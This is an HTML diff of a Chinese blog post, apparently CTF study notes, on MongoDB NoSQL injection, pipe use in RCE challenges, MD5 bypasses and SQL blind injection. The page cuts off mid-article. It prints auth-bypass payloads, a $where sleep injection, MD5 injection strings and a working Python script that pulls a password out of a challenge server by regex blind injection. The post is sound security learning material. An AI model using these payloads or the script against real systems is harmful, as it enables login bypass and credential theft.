@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" NoSQL注入\r意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下\r什么是NoSQL？\rNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。\n">
+<title>NoSQL注入</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/test-chinese/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="NoSQL注入">
+<meta property='og:description' content=" NoSQL注入\r意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下\r什么是NoSQL？\rNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。\n">
+<meta property='og:url' content='https://Oight.github.io/p/test-chinese/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-01T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="NoSQL注入">
+<meta name="twitter:description" content=" NoSQL注入\r意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下\r什么是NoSQL？\rNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">talk is cheap, show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#意外在学习内网渗透途中接触到了nosql注入发现知识库里也没有所以在这里记录一下">意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下</a>
+          <ol>
+            <li><a href="#什么是nosql">什么是NoSQL？</a></li>
+            <li><a href="#nosql-注入的分类">NoSQL 注入的分类</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#1ssti">1.SSTI</a>
+      <ol>
+        <li><a href="#如何判断是ssti">如何判断是SSTI</a></li>
+      </ol>
+    </li>
+    <li><a href="#2这道题提示查看cookie看看能从cookie中突破的还有什么">2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#1-利用-httponly">1. 利用 HttpOnly</a></li>
+            <li><a href="#2-利用未设置-secure-的-cookie">2. 利用未设置 Secure 的 Cookie</a></li>
+            <li><a href="#3-利用不安全的-samesite-属性">3. 利用不安全的 SameSite 属性</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/test-chinese/">NoSQL注入</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <blockquote>
+<h1 id="nosql注入">NoSQL注入
+</h1><h3 id="意外在学习内网渗透途中接触到了nosql注入发现知识库里也没有所以在这里记录一下">意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下
+</h3><h4 id="什么是nosql">什么是NoSQL？
+</h4><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009  年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
+<p>大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。</p>
+<blockquote>
+<p><a class="link" href="https://xz.aliyun.com/t/9908?time__1311=n4&#43;xnD0DuDRDci730=D/iaRWEDBn=QIIDRORYTD#toc-12"  target="_blank" rel="noopener"
+    >读这里详细了解MongoDB</a></p></blockquote>
+<h4 id="nosql-注入的分类">NoSQL 注入的分类
+</h4><h5 id="有两种-nosql-注入分类的方式">有两种 NoSQL 注入分类的方式：
+</h5><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">重言式注入
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">联合查询注入
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JavaScript 注入
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">盲注
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<p>常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL</p>
+<h5 id="php-中的nosql注入">PHP 中的NoSQL注入
+</h5><p>重言式注入：</p>
+<p>重言式注入通常也是判断是否为NoSQL的第一步。
+我们需要用$ne关键字构造永真条件来完成NoSQL注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=1&amp;password[$ne]=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码
+这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户</p>
+<p>所以我们也可以使用以下的payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=&amp;password[$ne]=
+</span></span><span class="line"><span class="cl">username[$gt]=&amp;password[$gt]=
+</span></span><span class="line"><span class="cl">username[$gte]=&amp;password[$gte]=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>JavaScript注入：</p>
+<p>MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript  进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的  JavaScript 代码，导致非法的数据获取或篡改。</p>
+<p>要想使用JS注入，我们需要了解一下$where操作符。</p>
+<p>在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：</p>
+<blockquote>
+<p>db.users.find({ $where: “function(){return(this.username == ‘whoami’)}” })
+{ “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }</p></blockquote>
+<p>由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
+<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == $userData)}&#34; })
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == &#39;a&#39;; sleep(5000))}&#34; })
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果此时服务器有 5 秒钟的延迟则说明注入成功。
+值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用<em>map-reduce</em>、<em>group</em> 命令可以访问到 Mongo Shell 中的全局函数和属性，如<em>db</em>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。
+在MongoDB 2.4 之后<em>db</em>访问不到了，但还是可以构造万能密码查出用户信息</p>
+<p>布尔盲注：
+当页面没有回显的时候可以使用$regex正则表达式来进行盲注，$regex可以达到和传统SQL注入中substr()函数相同的功能。</p>
+<p>和传统SQL注入一样，在已知用户名的情况下，我们需要知道密码长度。可以使用</p>
+<blockquote>
+<p>username=admin&amp;password[$regex]=.[4] (“[]”中的数字可以更改来确定密码长度，如果[4]为真，[5]为假，则密码为4位)</p></blockquote>
+<h5 id="nodejs中的mongodb注入">Node.js中的MongoDB注入
+</h5><p>Node.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过
+另外，如果过滤了$ne关键字可以使用Unicode编码绕过。
+在这里贴一个布尔盲注用于爆密码的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://node4.buuoj.cn:27409/login.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is GET</span>
+</span></span><span class="line"><span class="cl">            <span class="n">get_payload</span> <span class="o">=</span> <span class="s1">&#39;?username=admin&amp;password[$regex]=^</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST</span>
+</span></span><span class="line"><span class="cl">            <span class="n">post_payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password[$regex]&#34;</span><span class="p">:</span> <span class="s1">&#39;^&#39;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST with JSON</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{&#34;username&#34;:&#34;admin&#34;, &#34;password&#34;:{&#34;</span><span class="se">\\</span><span class="s2">u0024</span><span class="se">\\</span><span class="s2">u0072</span><span class="se">\\</span><span class="s2">u0065</span><span class="se">\\</span><span class="s2">u0067</span><span class="se">\\</span><span class="s2">u0065</span><span class="se">\\</span><span class="s2">u0078&#34;:&#34;^</span><span class="si">%s</span><span class="s2">&#34;}}&#34;&#34;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_payload</span><span class="p">)</span>    <span class="c1"># 简单发送 json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">#r = requests.post(url=url, data=post_payload)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;但没完全登录&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 422</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 4227</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 422766</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ......</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a13</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a130</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a1307</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a1307f</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="关于linux中的管道符-">关于Linux中的管道符 |
+</h1><p>管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下
+使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入
+因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag</p>
+<h1 id="md5">MD5
+</h1><p>MD5绕过真是五花八门，ffifdyop和129581926211651571912466741651878684928可用于SQL注入时语句经过MD5加密之后的绕过，其原理是：提交的字符串经过加密形成的16进制字符串转换成10进制数字后对应的asii表内容为：‘ or ‘ 6……。
+另外，数组绕过还可以绕过<em>if($_POST[‘param1’]!==$_POST[‘param2’]&amp;&amp;md5($_POST[‘param1’])===md5($_POST[‘param2’]))</em></p>
+<h1 id="sql布尔盲注">SQL布尔盲注
+</h1><p>第一次在题目中遇到布尔盲注，所以在这里记录一下
+题目：</p>
+<blockquote>
+<p>[[CISCN2019 华北赛区 Day2 Web1]Hack World
+1](https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)</p></blockquote>
+<p>我一开始怀疑是NoSQL（因为题目提示是SQL注入，PHP），结果尝试username[$ne]=1&amp;password[$ne]=1发现已经被过滤了。遂尝试普通的SQL注入
+输入*1’ or 1=1 –+<em>和</em>1;show databases();#*发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase）
+所以猜测这里需要布尔盲注，同时屏蔽了关键词
+尝试Fuzz一下看看屏蔽了哪些关键词</p>
+<div class="highlight"><div class="chroma">
